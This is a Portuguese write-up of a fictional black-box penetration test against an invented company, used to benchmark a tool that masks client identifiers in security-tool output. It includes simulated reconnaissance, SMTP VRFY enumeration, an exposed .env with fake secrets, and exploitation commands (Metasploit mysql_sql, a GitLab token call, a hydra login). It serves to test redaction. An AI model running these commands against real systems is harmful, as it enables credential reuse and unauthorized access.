# template-eng1

Modelo do **primeiro eng completo** com benchmarks do RedRaccoon (Mask + Redactor + exploitation + post-ex).  
O nome do ficheiro é o template; a instância de conteúdo é o eng fictício NyxLynx (13/09/2026).

# Eng fictício — NyxLynx Tecnologia S.A.

Simulação ponta a ponta do RedRaccoon (black box) como se fosse engagement real.  
**Carta oficial do primeiro eng completo com benchmarks** (13/09/2026). Cleanup (comandos sem dado novo) não entra nesta carta.  
Workspace: `eng-nyxlynx-bb-2026` (mapa sujo da 1ª cola). Reteste pós-fix no mesmo workspace; para Redactor “limpo” o caminho seria `eng-nyxlynx-bb-2026-r2` (não usado neste eng).

**Cliente (invenção):** NyxLynx Tecnologia S.A. — SaaS de edge/API, Recife-PE. Nada disso existe.

**Como se lê o benchmark (lei)** — igual à MareClara:

O número oficial de cada fase/tool é **só a 1ª cola**. Reteste depois do fix **não entra** na tabela de comparação; é só nota de que o remendo fechou *este* output.

| Métrica | O que mede |
|---------|------------|
| **Cobertura (recall)** | Dos identificadores de cliente no output, quantos foram tapados. Furo = vazou. |
| **Precisão** | Das máscaras aplicadas, quantas eram de fato cliente. Furo = falso positivo (comeu jargão). |
| **F1** | Média harmônica — número único para comparar fases/engs. |

Unidade = **valor único**. Barra de lançamento do produto: **F1 ≥ 95% na 1ª cola**.  
`blocked=` / `allowed=`: Sensei **não** cresce blocklist no meio do eng. Neste eng Kiron **não usou** nenhuma vez. Único candidato avisado: `nxl_edge`.

---

## Scope / blocklist (o que o cliente entregou no kickoff)

Só isso — de propósito pequeno:

```
ip=201.92.44.10
domain=nyxlynx.io
name=NyxLynx Tecnologia S.A., NyxLynx
```

O resto (hosts novos, pessoas, senhas, token, CNPJ, IPs internos) o Racoon tinha que achar sozinho.

---

## Fase 1 — Information Gathering passivo

Ferramentas: **whois** · **dig/host** · **gitleaks** (clone GitHub fictício)

### 1.1 Bloco whois (inventado)

```
% IANA WHOIS server
% for more information on IANA, visit http://www.iana.org

Domain Name: NYXLYNX.IO
Registry Domain ID: D503119988-IONOS
Registrar WHOIS Server: whois.ionos.com
Registrar URL: https://www.ionos.com
Updated Date: 2026-04-12T14:22:09Z
Creation Date: 2021-11-03T09:11:44Z
Registry Expiry Date: 2027-11-03T09:11:44Z
Registrar: IONOS SE
Registrar IANA ID: 1659
Registrar Abuse Contact Email: abuse@ionos.com
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Registrant Name: Helena Voss
Registrant Organization: NyxLynx Tecnologia S.A.
Registrant Street: Rua do Bom Jesus, 147
Registrant City: Recife
Registrant State/Province: PE
Registrant Postal Code: 50030-170
Registrant Country: BR
Registrant Phone: +55.81999887766
Registrant Email: helena.voss@nyxlynx.io
Admin Name: Theo Kade
Admin Email: legal@nyxlynx.io
Tech Email: infra@nyxlynx.io
Name Server: ns1.nyxlynx.io
Name Server: ns2.cloudflare.com
DNSSEC: unsigned
>>> Last update of WHOIS database: 2026-09-13T12:01:11Z <<<
```

### 1.2 Bloco DNS (inventado)

```
$ dig ns nyxlynx.io +short
ns1.nyxlynx.io.
ns2.cloudflare.com.

$ dig mx nyxlynx.io +short
10 mail.nyxlynx.io.

$ dig a www.nyxlynx.io +short
201.92.44.10

$ dig a api.nyxlynx.io +short
201.92.44.20

$ dig a staging.nyxlynx.io +short
201.92.44.30

$ dig a vpn.nyxlynx.io +short
201.92.44.11

$ dig a git.nyxlynx.io +short
201.92.44.40

$ dig a mail.nyxlynx.io +short
201.92.44.12

$ dig txt nyxlynx.io +short
"v=spf1 ip4:201.92.44.12 include:_spf.google.com include:mailgun.org -all"
"google-site-verification=o2k9XmQ8pL4nNotASecret"
"v=DMARC1; p=none; rua=mailto:dmarc@nyxlynx.io"

$ host -t soa nyxlynx.io
nyxlynx.io has SOA record ns1.nyxlynx.io. infra.nyxlynx.io. 2026091301 7200 3600 1209600 3600
```

### 1.3 Bloco gitleaks (inventado)

```
$ git clone https://github.com/nyxlynx-labs/edge-gateway.git
Cloning into 'edge-gateway'...
remote: Enumerating objects: 84, done.
Receiving objects: 100% (84/84), 126.40 KiB | 1.02 MiB/s, done.

$ gitleaks detect -s . --no-banner
Finding:     generic-api-key
Secret:      sk_live_[EXAMPLE_NYXLYNX]
RuleID:      generic-api-key
File:        config/stripe.env
Line:        4
Commit:      7c91e2a
Author:      Helena Voss
Email:       helena.voss@nyxlynx.io
Date:        2026-08-02T18:11:09Z

Finding:     aws-access-key-id
Secret:      AKIAIOSFODNN7EXAMPLE
RuleID:      aws-access-key-id
File:        infra/terraform.tfvars
Line:        12
Commit:      7c91e2a
Author:      Helena Voss
Email:       helena.voss@nyxlynx.io

Finding:     aws-secret-access-key
Secret:      wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
RuleID:      aws-secret-access-key
File:        infra/terraform.tfvars
Line:        13

Finding:     generic-password
Secret:      Lynx#Edge2024!
RuleID:      generic-password
File:        .env.example
Line:        6
Commit:      2ee014c
Author:      Mira Solano
Email:       mira.solano@nyxlynx.io
Date:        2026-07-19T09:44:01Z

$ cat README.md
# Edge Gateway — NyxLynx
Internal staging: https://staging.nyxlynx.io
Jump host: bastion.nyxlynx.internal (10.8.4.12)
On-call: Theo Kade (theo.kade@nyxlynx.io) / Mira Solano (mira.solano@nyxlynx.io)
Legal entity: NyxLynx Tecnologia S.A. — CNPJ 41.773.209/0001-55

$ cat .env.example
APP_NAME=NyxLynxEdge
APP_URL=https://api.nyxlynx.io
DB_HOST=db01.nyxlynx.internal
DB_USER=nx_app
DB_PASSWORD=Lynx#Edge2024!
VPN_PSK=Harbor-Lynx-09
```

### 1.4 Benchmark oficial — 1ª cola

| Tool | Cobertura | Precisão | F1 |
|------|-----------|----------|-----|
| whois | 67% | 80% | **73%** |
| dig/host | 100% | 100% | **100%** |
| gitleaks | 86% | 90% | **88%** |
| **Fase 1 (oficial)** | **84%** | **90%** | **87%** |

**Vazou:** telefone, rua, CEP, Recife; `Helena Voss` no `Author:`; secret AWS com `/`; `DB_USER=nx_app`.  
**Comeu jargão:** `Expiry Date` → PERSON; `abuse@ionos.com`; `Jump host`; `MiB/s`; linha Organization fundida com o nome.  
**Acertou sozinho (fora da blocklist):** hosts novos, IPs novos, CNPJ, e-mails, VPN_PSK, senha `Lynx#Edge2024!`, `bastion.nyxlynx.internal`.

Sem `blocked=` / `allowed=` nesta fase.

### 1.5 Fixes (não é benchmark)

| Erro da 1ª cola | Onde | Correção |
|-----------------|------|----------|
| Telefone / rua / cidade / CEP whois | `sanitize.py` | `RE_PHONE`, `RE_WHOIS_STREET/CITY/POSTAL`; CEP BR não é lixo |
| `Author:` / Registrant Name | `sanitize.py` | rótulo de tool + nome |
| Secret AWS com `/` | `sanitize.py` | `RE_GITLEAKS_SECRET` + senha não recusar só por barra |
| `DB_USER=` | `sanitize.py` | `RE_ENV_USERNAME` |
| `Expiry` / `Jump host` / `MiB/s` / IONOS | `sanitize.py` + allow | jargão whois/gitleaks |
| `abuse@ionos.com` | `sanitize.py` | e-mail de registrar = domínio público da tool |
| `nyxlynx.io` vs `NYXLYNX.IO` | `placeholders.py` | DOMAIN/EMAIL case-insensitive no mapa |

Nota (não comparar): reteste — dig e gitleaks passam; whois na 1ª volta ainda deixou o CEP (regra de “pouca letra”); 2ª volta whois: CEP → `TARGET_ADDR_*`. Remendo desta evidência fecha. F1 oficial permanece **87%**.

---

## Fase 2 — Information Gathering ativo

Ferramentas: **nmap** (`-sV -sC`) · **WhatWeb** · **openssl + curl**

### 2.1 Bloco nmap (inventado)

```
# Nmap 7.95 scan initiated Sun Sep 13 08:05:00 2026 as: nmap -sV -sC -oN nyxlynx-ig-ativo.nmap 201.92.44.10 201.92.44.11 201.92.44.12 201.92.44.20 201.92.44.30 201.92.44.40
Nmap scan report for www.nyxlynx.io (201.92.44.10)
Host is up (0.033s latency).
rDNS record for 201.92.44.10: edge.nyxlynx.io
Not shown: 997 filtered tcp ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://www.nyxlynx.io/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: NyxLynx | Edge Control Plane
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=*.nyxlynx.io/organizationName=NyxLynx Tecnologia S.A./stateOrProvinceName=Pernambuco/countryName=BR/emailAddress=helena.voss@nyxlynx.io
| Issuer: commonName=R11/organizationName=Let's Encrypt/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Not valid before: 2026-07-18T00:00:00
|_Not valid after:  2026-10-16T23:59:59
| http-headers:
|   Strict-Transport-Security: max-age=31536000
|   X-Powered-By: PHP/8.2.12
|_  X-Internal-Host: gw01.nyxlynx.internal
22/tcp  open  ssh      OpenSSH 9.2p1 Ubuntu 2ubuntu0.6 (Ubuntu Linux; protocol 2.0)

Nmap scan report for vpn.nyxlynx.io (201.92.44.11)
Host is up (0.041s latency).
PORT     STATE SERVICE VERSION
443/tcp  open  ssl/http OpenVPN Access Server / Palo Alto GlobalProtect?
|_http-title: NyxLynx — VPN SSL
| ssl-cert: Subject: commonName=vpn.nyxlynx.io/organizationName=NyxLynx Tecnologia S.A.
|_Not valid before: 2026-03-02T00:00:00
1194/tcp open  openvpn OpenVPN
22/tcp   open  ssh     OpenSSH 9.2p1 Ubuntu 2ubuntu0.6 (Ubuntu Linux; protocol 2.0)

Nmap scan report for mail.nyxlynx.io (201.92.44.12)
Host is up (0.038s latency).
PORT    STATE SERVICE VERSION
25/tcp  open  smtp    Postfix smtpd
|_smtp-commands: mail.nyxlynx.io, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
443/tcp open  ssl/http nginx 1.24.0
|_http-title: webmail | NyxLynx
587/tcp open  smtp    Postfix smtpd
993/tcp open  ssl/imap Dovecot imapd

Nmap scan report for api.nyxlynx.io (201.92.44.20)
Host is up (0.029s latency).
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx 1.24.0
|_http-title: NyxLynx API Gateway
|_http-server-header: nginx/1.24.0
| http-headers:
|_  X-Internal-Host: api-int.nyxlynx.internal
22/tcp  open  ssh      OpenSSH 9.2p1 Ubuntu 2ubuntu0.6 (Ubuntu Linux; protocol 2.0)

Nmap scan report for staging.nyxlynx.io (201.92.44.30)
Host is up (0.044s latency).
PORT    STATE SERVICE VERSION
443/tcp open  ssl/http nginx 1.24.0
|_http-title: STAGING — NyxLynx Edge
|_http-server-header: nginx/1.24.0 (Ubuntu)
22/tcp  open  ssh      OpenSSH 9.2p1 Ubuntu 2ubuntu0.6 (Ubuntu Linux; protocol 2.0)

Nmap scan report for git.nyxlynx.io (201.92.44.40)
Host is up (0.047s latency).
PORT     STATE SERVICE VERSION
443/tcp  open  ssl/http GitLab (Ubuntu)
|_http-title: Sign in · GitLab
|_http-server-header: nginx
22/tcp   open  ssh     OpenSSH 9.2p1 Ubuntu 2ubuntu0.6 (Ubuntu Linux; protocol 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 6 IP addresses (6 hosts up) scanned in 91.04 seconds
```

### 2.2 Bloco WhatWeb (inventado)

```
WhatWeb report for https://www.nyxlynx.io
Status    : 200 OK
Title     : NyxLynx | Edge Control Plane
IP        : 201.92.44.10
Country   : BRAZIL, BR

Summary   : nginx[1.24.0], Bootstrap[5.3.1], Cookies[NXSESSID], Country[BRAZIL][BR], Email[contato@nyxlynx.io, helena.voss@nyxlynx.io], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[201.92.44.10], JQuery[3.7.1], Meta-Author[Helena Voss - SRE NyxLynx], PHP[8.2.12], PasswordField[senha], Script[text/javascript], UncommonHeaders[x-nyxlynx-env], X-Powered-By[PHP/8.2.12]

https://api.nyxlynx.io [401 Unauthorized] Country[BRAZIL][BR], HTTPServer[nginx/1.24.0], IP[201.92.44.20], nginx[1.24.0], Title[NyxLynx API Gateway], UncommonHeaders[x-internal-host], Header[X-Internal-Host: api-int.nyxlynx.internal]

https://staging.nyxlynx.io [200 OK] Country[BRAZIL][BR], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[201.92.44.30], nginx[1.24.0], Title[STAGING — NyxLynx Edge], Email[theo.kade@nyxlynx.io]
```

### 2.3 Bloco openssl + curl (inventado)

```
$ echo | openssl s_client -connect www.nyxlynx.io:443 -servername www.nyxlynx.io 2>/dev/null | openssl x509 -noout -subject -issuer -dates
subject=CN = *.nyxlynx.io, O = NyxLynx Tecnologia S.A., ST = Pernambuco, C = BR, emailAddress = helena.voss@nyxlynx.io
issuer=CN = R11, O = Let's Encrypt, C = US
notBefore=Jul 18 00:00:00 2026 GMT
notAfter=Oct 16 23:59:59 2026 GMT

$ curl -sI https://www.nyxlynx.io
HTTP/2 200
server: nginx/1.24.0
strict-transport-security: max-age=31536000
x-powered-by: PHP/8.2.12
x-internal-host: gw01.nyxlynx.internal
x-nyxlynx-env: prod
set-cookie: NXSESSID=nxl_8f2a91c; path=/; secure
```

### 2.4 Benchmark oficial — 1ª cola

| Tool | Cobertura | Precisão | F1 |
|------|-----------|----------|-----|
| nmap | 100% | 95% | **97%** |
| WhatWeb | 93% | 100% | **96%** |
| openssl/curl | 100% | 88% | **93%** |
| **Fase 2 (oficial)** | **98%** | **94%** | **~95%** |

**Vazou:** `Helena Voss` dentro de `Meta-Author[...]`.  
**Comeu jargão:** `Edge Control Plane`; cookie `NXSESSID`; `*.nyxlynx.io` → `*TARGET_DOMAIN_*` (ponto colado); `Pernambuco` como PERSON.

Hosts novos (`edge.`, `gw01.internal`, `api-int.internal`), IPs e Let’s Encrypt/VRFY/GitLab passaram. Sem `blocked=` / `allowed=`.

### 2.5 Fixes (não é benchmark)

| Erro da 1ª cola | Onde | Correção |
|-----------------|------|----------|
| `Meta-Author[Helena…]` | `sanitize.py` | rótulo WhatWeb; nome segue o mapa |
| `Edge Control Plane` | allow técnico | jargão de título, não cliente |
| cookie `*SESSID` | `sanitize.py` | rótulo de cookie, não APIKEY |
| `*.dominio` → `*TARGET_` | `sanitize.py` | normalizar `*.` antes do span |
| `ST = Pernambuco` | rótulo | mapa sujo da 1ª cola (`PERSON_6`); em workspace limpo sairia ADDRESS |

Nota (não comparar): reteste WhatWeb + openssl/curl **passa**. Helena no Meta-Author, Edge Control Plane, NXSESSID e `*.TARGET_DOMAIN_1` fecharam. F1 oficial permanece **~95%**.

---

## Fase 3 — Enumeration

Ferramentas: **smtp-user-enum + nc** · **gobuster** · **GitLab API** (sem auth)

### 3.1 Bloco smtp-user-enum + nc (inventado)

```
$ smtp-user-enum -M VRFY -U users.txt -t 201.92.44.12 -p 25
Starting smtp-user-enum v1.2
 ----------------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------------
| Target SMTP Server   : 201.92.44.12
| Port                 : 25
| VRFY/EXPN/RCPT TO    : VRFY
 ----------------------------------------------------------------

201.92.44.12: hvoss exists
201.92.44.12: tkade exists
201.92.44.12: msolano exists
201.92.44.12: helena.voss exists
201.92.44.12: theo.kade exists
201.92.44.12: deploy exists
201.92.44.12: nxl-ci exists
201.92.44.12: admin does not exist
201.92.44.12: teste does not exist

252 2.0.0 hvoss@nyxlynx.io
252 2.0.0 tkade@nyxlynx.io
252 2.0.0 msolano@nyxlynx.io

$ nc -nv 201.92.44.12 25
(UNKNOWN) [201.92.44.12] 25 (smtp) open
220 mail.nyxlynx.io ESMTP Postfix
VRFY deploy
252 2.0.0 deploy@nyxlynx.io
QUIT
221 2.0.0 Bye
```

### 3.2 Bloco gobuster (inventado)

```
$ gobuster dir -u https://staging.nyxlynx.io -w /usr/share/wordlists/dirb/common.txt -k -t 30
===============================================================
Gobuster v3.6
===============================================================
https://staging.nyxlynx.io/.env                 (Status: 200) [Size: 891]
https://staging.nyxlynx.io/.git/                (Status: 301) [Size: 178] [--> /.git/]
https://staging.nyxlynx.io/backup               (Status: 301) [Size: 178] [--> /backup/]
https://staging.nyxlynx.io/debug.php            (Status: 200) [Size: 4412]
https://staging.nyxlynx.io/login                (Status: 200) [Size: 3104]
https://staging.nyxlynx.io/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

### 3.3 Bloco GitLab API (inventado)

```
$ curl -sk https://git.nyxlynx.io/api/v4/users?per_page=20
[{"id":1,"username":"root","name":"Administrator","state":"active"},
{"id":7,"username":"hvoss","name":"Helena Voss","state":"active","web_url":"https://git.nyxlynx.io/hvoss"},
{"id":8,"username":"tkade","name":"Theo Kade","state":"active","web_url":"https://git.nyxlynx.io/tkade"},
{"id":11,"username":"msolano","name":"Mira Solano","state":"active","web_url":"https://git.nyxlynx.io/msolano"},
{"id":14,"username":"nxl-ci","name":"NyxLynx CI Bot","state":"active"}]

$ curl -sk https://git.nyxlynx.io/api/v4/projects?per_page=5
[{"id":22,"name":"edge-gateway","path_with_namespace":"nyxlynx-labs/edge-gateway","http_url_to_repo":"https://git.nyxlynx.io/nyxlynx-labs/edge-gateway.git","description":"NyxLynx edge control plane"},
{"id":31,"name":"vpn-profiles","path_with_namespace":"infra/vpn-profiles","http_url_to_repo":"https://git.nyxlynx.io/infra/vpn-profiles.git"}]
```

### 3.4 Benchmark oficial — 1ª cola

| Tool | Cobertura | Precisão | F1 |
|------|-----------|----------|-----|
| smtp-user-enum + nc | 100% | 100% | **100%** |
| gobuster | 100% | 100% | **100%** |
| GitLab API | 22% | 100% | **36%** |
| **Fase 3 (oficial)** | **74%** | **100%** | **79%** |

SMTP/gobuster: logins `hvoss`/`deploy`/`nxl-ci` tapados; `admin`/`teste`, `QUIT`, Gobuster e paths `.env` intactos.  
GitLab 1ª cola: vazou JSON em claro (`Helena Voss`, `Theo Kade`, `Mira Solano`, usernames `hvoss`/`tkade`/`msolano`/`nxl-ci`). Marca e host mascararam; `root`/`Administrator`/`vpn-profiles` ficaram (certo). Precisão 100% porque o pouco que tapou, tapou certo — filtro tímido.

### 3.5 Fixes (não é benchmark)

| Erro da 1ª cola | Onde | Correção |
|-----------------|------|----------|
| JSON `"username"` / `"name"` | `sanitize.py` | `RE_JSON_USERNAME` + displayname/`name` de API REST |

Nota (não comparar): reteste GitLab **passa** (logins/nomes no JSON e `web_url`). F1 oficial permanece **79%**.

---

## Fase 4 — Vulnerability analysis

Ferramentas: **curl** `.env` + `debug.php` · **nuclei**

### 4.1 Bloco curl (inventado)

```
$ curl -sk https://staging.nyxlynx.io/.env
APP_NAME=NyxLynxEdge
APP_ENV=staging
APP_DEBUG=true
APP_KEY=base64:nXl8Qm2pL4vXzYwC1aB9dE3fG6hJ7==
APP_URL=https://staging.nyxlynx.io

DB_CONNECTION=mysql
DB_HOST=db01.nyxlynx.internal
DB_PORT=3306
DB_DATABASE=nxl_edge
DB_USERNAME=nxl_app
DB_PASSWORD=Lynx#Edge2024!

MAIL_HOST=mail.nyxlynx.io
MAIL_USERNAME=noreply@nyxlynx.io
MAIL_PASSWORD=N0Reply!NyxLynx
VPN_PSK=Harbor-Lynx-09
GITLAB_TOKEN=glpat-example-nyxlynx-fake-token

$ curl -sk https://staging.nyxlynx.io/debug.php | head -n 35
<!DOCTYPE html>
<html>
<head><title>NyxLynx debug</title></head>
<body>
<h1>PHP Version 8.2.12</h1>
<h2>System</h2>
Linux gw01.nyxlynx.internal 6.5.0-35-generic #35-Ubuntu SMP x86_64
Server API: FPM/FastCGI
DOCUMENT_ROOT: /var/www/nyxlynx-edge
PWD: /var/www/nyxlynx-edge
$_SERVER['SERVER_ADMIN'] => helena.voss@nyxlynx.io
$_SERVER['SERVER_NAME'] => staging.nyxlynx.io
$_SERVER['SERVER_ADDR'] => 10.8.4.21
$_ENV['DB_PASSWORD'] => Lynx#Edge2024!
$_ENV['GITLAB_TOKEN'] => glpat-example-nyxlynx-fake-token
```

### 4.2 Bloco nuclei (inventado)

```
$ nuclei -u https://staging.nyxlynx.io -u https://mail.nyxlynx.io -u https://www.nyxlynx.io -silent
[critical] [files/env-file] https://staging.nyxlynx.io/.env
[critical] [misconfiguration/git-config] https://staging.nyxlynx.io/.git/config
[medium] [smtp/vrfy-enum] 201.92.44.12:25 ["VRFY enabled — valid users distinguishable"]
[low] [http/debug-enabled] https://staging.nyxlynx.io/debug.php
[info] [http/missing-httponly] https://www.nyxlynx.io ["NXSESSID without HttpOnly"]
```

### 4.3 Benchmark oficial — 1ª cola

| Tool | Cobertura | Precisão | F1 |
|------|-----------|----------|-----|
| curl .env + debug.php | 93% | 93% | **93%** |
| nuclei | 100% | 100% | **100%** |
| **Fase 4 (oficial)** | **97%** | **97%** | **97%** |

Nuclei limpo. Curl: senhas, PSK, `APP_KEY`, `10.8.4.21`, `gw01` passaram.  
**Vazou:** `GITLAB_TOKEN=glpat-…`. **FP:** `$_ENV['GITLAB_TOKEN']` → `$_PERSON_7']`.  
**Dívida sem classe (não vai para o fonte):** `DB_DATABASE=nxl_edge` — candidato a `blocked=nxl_edge` (Kiron não usou).

### 4.4 Fixes (não é benchmark)

| Erro da 1ª cola | Onde | Correção |
|-----------------|------|----------|
| `GITLAB_TOKEN=` / `glpat-` | `sanitize.py` | env `TOKEN` + prefixo GitLab |
| NER em `$_ENV['…']` | `sanitize.py` | skip Presidio em chave PHP |

Nota (não comparar): reteste curl **passa** no token/`$_ENV`. Sobra `nxl_edge` (abreviação). F1 oficial permanece **97%**.

---

## Fechamento — Redactor (relatório com placeholders)

Cola no modo **REDACTOR** / PAST REPORT (não Mask). Benchmark: 1ª cola do reconstruct.

### R-1 — Crítico (inventado / placeholders)

```
[ID: F-01] CRITICAL: Exposed Application Secrets via Public .env and debug.php
Finding Overview Severity: CRITICAL (9.8) — Asset: TARGET_DOMAIN_7 (staging)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Service: HTTPS (nginx / PHP) — CWE: CWE-200 (Exposure of Sensitive Information)
Risk Mapping & Compliance
● ASVS: V8.3 (Sensitive Private Data)
● NIST CSF: PR.DS-5 (Protections against data leaks)
● Business Impact: Critical. Unauthenticated retrieval of database credentials, mail secrets, VPN PSK, GitLab token and internal hostnames (TARGET_DOMAIN_12, TARGET_DOMAIN_14) enables direct compromise of CLIENT_NAME_5 application data and adjacent services.
Attack Narrative
Passive and active reconnaissance mapped TARGET_DOMAIN_7 as the staging edge of CLIENT_NAME_2. Directory enumeration with gobuster then disclosed world-readable files: /.env, /.git/ and /debug.php (HTTP 200).
A silent curl of https://TARGET_DOMAIN_7/.env returned production-like secrets in cleartext: DB_USERNAME TARGET_USER_9, DB_PASSWORD TARGET_PASS_3, MAIL_PASSWORD TARGET_PASS_6, VPN_PSK TARGET_PASS_4, APP_KEY TARGET_PASS_5 and GITLAB_TOKEN TARGET_APIKEY_2. APP_DEBUG was true.
debug.php confirmed the same password in $_ENV, the internal address TARGET_IP_8, kernel host TARGET_DOMAIN_14, and document root under /var/www/CLIENT_NAME_5-edge. Nuclei independently flagged files/env-file and misconfiguration/git-config as critical.
These artifacts are sufficient to authenticate to the backend on TARGET_DOMAIN_12 and to reuse TARGET_EMAIL_13 / TARGET_PASS_6 against TARGET_DOMAIN_4.
Technical Evidence & Documentation
1. Content discovery (gobuster)
● Command: gobuster dir -u https://TARGET_DOMAIN_7 -w /usr/share/wordlists/dirb/common.txt -k -t 30
● Key Result: /.env, /.git/, /debug.php — Status 200.
2. Secret retrieval (curl)
● Command: curl -sk https://TARGET_DOMAIN_7/.env
● Key Result: DB_HOST=TARGET_DOMAIN_12; DB_PASSWORD=TARGET_PASS_3; GITLAB_TOKEN=TARGET_APIKEY_2; VPN_PSK=TARGET_PASS_4.
3. Confirmation (nuclei)
● Command: nuclei -u https://TARGET_DOMAIN_7 -u https://TARGET_DOMAIN_4 -silent
● Key Result: [critical] files/env-file ; [critical] git-config.
```

### R-2 — Médio (inventado / placeholders)

```
[ID: F-02] MEDIUM: SMTP VRFY User Enumeration
Finding Overview Severity: MEDIUM (5.3) — Asset: TARGET_DOMAIN_4 (TARGET_IP_6)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Service: SMTP (Postfix) — CWE: CWE-204 (Observable Response Discrepancy)
Risk Mapping & Compliance
● ASVS: V2.2 (General Authenticator Security)
● NIST CSF: PR.AC-7 (Users, devices and other assets authenticated)
● Business Impact: Medium. Valid mailboxes of CLIENT_NAME_5 staff (TARGET_USER_2, TARGET_USER_3, TARGET_EMAIL_9, PERSON_5) can be distinguished without authentication, feeding password spray and phishing against the same identities found in OSINT and GitLab.
Attack Narrative
Service detection on TARGET_IP_6 advertised VRFY among smtp-commands. Enumeration with smtp-user-enum (-M VRFY) against TARGET_IP_6:25 returned "exists" for TARGET_USER_2, TARGET_USER_3, TARGET_USER_4, TARGET_USER_5, TARGET_USER_6, TARGET_USER_7 and TARGET_USER_8, while generic probes (admin, teste) did not exist.
A manual VRFY via nc -nv TARGET_IP_6 25 confirmed TARGET_USER_7 and expanded the address TARGET_EMAIL_12. Nuclei template smtp/vrfy-enum classified the same service as medium.
This does not by itself yield a shell; it reliably maps human users of CLIENT_NAME_5 for the next credential-attack phase.
Technical Evidence & Documentation
1. Banner / commands (nmap + smtp-user-enum)
● Command: smtp-user-enum -M VRFY -U users.txt -t TARGET_IP_6 -p 25
● Key Result: TARGET_USER_2 … TARGET_USER_8 exist; TARGET_EMAIL_9 / TARGET_EMAIL_10 in 252 replies.
2. Manual VRFY
● Command: nc -nv TARGET_IP_6 25  then  VRFY TARGET_USER_7
● Key Result: 252 2.0.0 TARGET_EMAIL_12 ; banner 220 TARGET_DOMAIN_4 ESMTP Postfix.
```

### Benchmark oficial Redactor — 1ª cola

| Métrica | Valor |
|---------|-------|
| Cobertura | **100%** |
| Precisão | **100%** |
| F1 | **100%** |
| Cosmética | `CLIENT_NAME_2.` → `NyxLynx Tecnologia S.A..` (o valor já termina em `S.A.`) — não baixa F1 |

Confirmações: staging, `db01`/`gw01`, senhas, `glpat-`, `nxl_app`, `10.8.4.21`, VRFY (`hvoss` … `nxl-ci`), Helena. gobuster, nuclei, CVSS, CWE, Postfix intactos.

### Fixes Redactor (não é benchmark)

Nenhum furo de reconstruct. Só cosmética do ponto duplo (igual MareClara).  
UX (depois, na exploitation): se o usuário colar comando longo no Questions do Redactor, a mensagem agora aponta Mask para reconstruct pequeno — **sem** regra que tente distinguir comando vs relatório (desbalancearia o modo). PAST REPORT continua válido se a pessoa errar a aba.

---

## Fase 5 — Exploitation

Fluxo: IA manda comando **com placeholders** → **Questions no Mask** (reveal) → output do terminal → **PAST INPUT**. Não é Redactor.

A 1ª cola de reconstruct no Mask **passa**. A aba Redactor por engano (msg *Use PAST REPORT*) **não** entra no F1.

### 5.1 Blocos reconstruct (placeholders — Questions Mask)

```
use auxiliary/admin/mysql/mysql_sql
set RHOSTS TARGET_DOMAIN_12
set USERNAME TARGET_USER_9
set PASSWORD TARGET_PASS_3
set SQL select user,host from mysql.user;
run
```

```
curl -sk --header "PRIVATE-TOKEN: TARGET_APIKEY_2" https://TARGET_DOMAIN_9/api/v4/projects?per_page=10
```

```
hydra -l TARGET_USER_2 -p TARGET_PASS_3 TARGET_DOMAIN_9 https-post-form "/users/sign_in:user[login]=^USER^&user[password]=^PASS^:Invalid"
```

### 5.2 Benchmark oficial reconstruct — 1ª cola

| Tool | Cobertura | Precisão | F1 |
|------|-----------|----------|-----|
| mysql_sql (preset) | 100% | 100% | **100%** |
| curl GitLab token | 100% | 100% | **100%** |
| hydra | 100% | 100% | **100%** |
| **Reconstruct (oficial)** | **100%** | **100%** | **100%** |

Reveal devolveu `db01.nyxlynx.internal`, `nxl_app`, `Lynx#Edge2024!`, `glpat-…`, `git.nyxlynx.io`, `hvoss`. Sintaxe `^USER^`/`^PASS^` / `sign_in` intacta no comando reconstruído.

### 5.3 Blocos output simulado (PAST INPUT Mask)

```
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running mysql_sql against db01.nyxlynx.internal:3306
[*] 10.8.4.33:3306 - SELECT user,host FROM mysql.user
[*] 10.8.4.33:3306
    user      host
    nxl_app   %
    root      localhost
    backup    db01.nyxlynx.internal
    nxl_repl  10.8.4.%
[*] Auxiliary module execution completed
```

```
$ curl -sk --header "PRIVATE-TOKEN: glpat-example-nyxlynx-fake-token" https://git.nyxlynx.io/api/v4/projects?per_page=10
[{"id":22,"name":"edge-gateway","path_with_namespace":"nyxlynx-labs/edge-gateway","visibility":"private"},
{"id":31,"name":"vpn-profiles","path_with_namespace":"infra/vpn-profiles","visibility":"private"},
{"id":44,"name":"prod-secrets","path_with_namespace":"nyxlynx-labs/prod-secrets","visibility":"private","description":"Helm values — do not clone to laptops"}]
```

```
$ hydra -l hvoss -p 'Lynx#Edge2024!' git.nyxlynx.io https-post-form "/users/sign_in:user[login]=^USER^&user[password]=^PASS^:Invalid"
Hydra v9.5 starting
[DATA] attacking http-post-form://git.nyxlynx.io:443/users/sign_in
[443][http-post-form] host: git.nyxlynx.io   login: hvoss   password: Lynx#Edge2024!
1 of 1 target successfully completed, 1 valid password found
```

### 5.4 Benchmark oficial PAST INPUT — 1ª cola

| Tool | Cobertura | Precisão | F1 |
|------|-----------|----------|-----|
| mysql_sql | 40% | 100% | **57%** |
| GitLab API (token) | 100% | 100% | **100%** |
| hydra | 100% | 50% | **67%** |
| **Exploitation outputs (oficial)** | **80%** | **83%** | **~75%** |

**mysql:** tapou host/IP; vazou `nxl_app`, `nxl_repl`, `10.8.4.%`.  
**GitLab:** token, host, marca ok; repos intactos.  
